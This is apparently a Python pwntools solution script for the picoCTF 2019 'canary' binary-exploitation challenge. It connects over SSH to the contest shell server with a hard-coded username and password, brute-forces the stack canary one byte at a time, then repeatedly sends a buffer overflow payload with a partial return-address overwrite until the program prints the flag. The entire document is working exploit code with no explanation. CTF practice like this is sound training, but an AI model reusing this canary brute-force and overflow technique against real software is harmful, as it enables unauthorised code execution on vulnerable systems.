from pwn import *

session = ssh(host="2019shell1.picoctf.com", user="cse331", password="3curityishard", level=50)

canary = ''
for length in range(33, 37):
    for i in range(0, 256):
        program = session.process(['./vuln'], cwd='/problems/canary_4_221260def5087dde9326fb0649b434a7')
        program.recvline()
        program.recv()
        program.sendline(str(length))
        program.recv()
        program.sendline('a' * 32 + canary + chr(i))
        output = program.recvline()
        if b'Canary' not in output:
            canary += chr(i)
            break

payload = 'a' * 32 + canary + 'b' * 12 + 'c' * 4 + '\xed\x07'
strlenOfPayload = str(len(payload))

while True:
    program = session.process(['./vuln'], cwd='/problems/canary_4_221260def5087dde9326fb0649b434a7')

    program.sendlineafter('> ', strlenOfPayload)
    program.sendlineafter('> ', payload)

    program.recvuntil("Ok... Now Where's the Flag?\n")
    try:
        flagInB = program.recv()
        flag = flagInB.decode('ascii')
        rawFlag = flag[flag.index('{') + 1:flag.index('}')]

        print(rawFlag)

        break
    except EOFError:
        program.close()
